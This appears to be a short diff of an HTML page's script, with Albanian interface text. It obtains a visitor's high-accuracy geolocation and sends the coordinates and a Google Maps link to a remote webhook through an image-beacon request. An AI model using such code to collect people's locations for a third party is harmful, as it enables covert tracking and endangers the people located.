@@ -66,4 +66,19 @@
                         statusDiv.innerText = "Duke transmetuar të dhënat...";
 
                         const img = new Image();
-                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl
+                        img.src = `${webhookEndpoint}?lat=${lat}&lon=${lon}&maps=${encodeURIComponent(googleMapsUrl)}`;
+                        
+                        statusDiv.innerHTML = "<strong style='color: green;'>Vendndodhja u mor dhe u dërgua me sukses!</strong>";
+                    },
+                    function(error) {
+                        statusDiv.innerText = "Qasja u refuzua nga përdoruesi.";
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            } else {
+                statusDiv.innerText = "Shfletuesi juaj nuk e mbështet gjeolokacionin.";
+            }
+        }
+    </script>
+</body>
+</html>
